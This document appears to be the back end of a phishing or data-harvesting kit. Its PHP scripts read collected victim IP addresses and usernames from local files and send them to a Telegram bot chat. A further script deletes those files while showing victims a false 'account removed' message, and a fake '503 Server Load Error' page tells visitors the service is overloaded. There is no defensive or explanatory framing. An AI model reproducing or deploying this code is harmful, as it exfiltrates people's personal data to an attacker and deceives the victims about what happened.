<?php
// Telegram Bot API token
$botToken = 'lol';
// Chat ID where the message will be sent
$chatId = '6068365157';
// File paths
$ipFile = 'ip.txt';
$usernameFile = 'usernames.txt';
// Read the contents of the files
$ip = file_get_contents($ipFile);
$username = file_get_contents($usernameFile);
// Prepare the message
$message = "IP: " . $ip . "\nUsername: " . $username;
// Telegram API endpoint
$telegramApiUrl = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
// Prepare the POST data
$postData = array(
    'chat_id' => $chatId,
    'text' => $message
);
// Send the message using cURL
$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
// Check if the message was sent successfully
if ($response === false) {
    echo "Error m: " . curl_error($ch);
} else {
    echo "REPORTED !";
}
?>
<?php
// Telegram Bot API token
$ipFile = 'ip.txt';
// Read the contents of the file
$ip = file_get_contents($ipFile);
// Telegram API endpoint
$telegramApiUrl = 'https://api.telegram.org/bot' . $botToken . '/sendDocument';
// Prepare the POST data
$postData = array(
    'chat_id' => $chatId,
    'document' => new CURLFile($ipFile)
);
// Send the document using cURL
$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
// Check if the message was sent successfully
if ($response === false) {
    echo "Error: " . curl_error($ch);
} else {
    echo "";
}
?>

<?php
$ipFilePath = 'ip.txt';
$usernameFilePath = 'usernames.txt';
// Remove username.txt
if (file_exists($usernameFilePath)) {
    if (unlink($usernameFilePath)) {
        echo "<br>removed your account successfully.";
    } else {
        echo "Error removing.";
    }
} else {
    echo "username.txt does not exist.";
}
if (file_exists($ipFilePath)) {
    if (unlink($ipFilePath)) {
        echo "warning if you get reported error please use vpn";
    } else {
        echo "Error removin";
    }
} else {
    echo " does not exist.";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Server Load Error</title>
  <style>
    body {
      background-color: #f5f5f5;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    
    .container {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    
    .error-container {
      text-align: center;
    }
    
    .error-code {
      font-size: 72px;
      font-weight: bold;
      margin: 0;
    }
    
    .error-message {
      font-size: 24px;
      margin: 20px 0;
    }
    
    .error-description {
      font-size: 18px;
      margin: 10px 0;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="error-container">
      <h1 class="error-code">503</h1>
      <h2 class="error-message">Server Load Error</h2>
      <p class="error-description">The server is currently experiencing a high load and cannot handle the request. To many people already using our service so try after some hours </p>
    </div>
  </div>
</body>

</html>
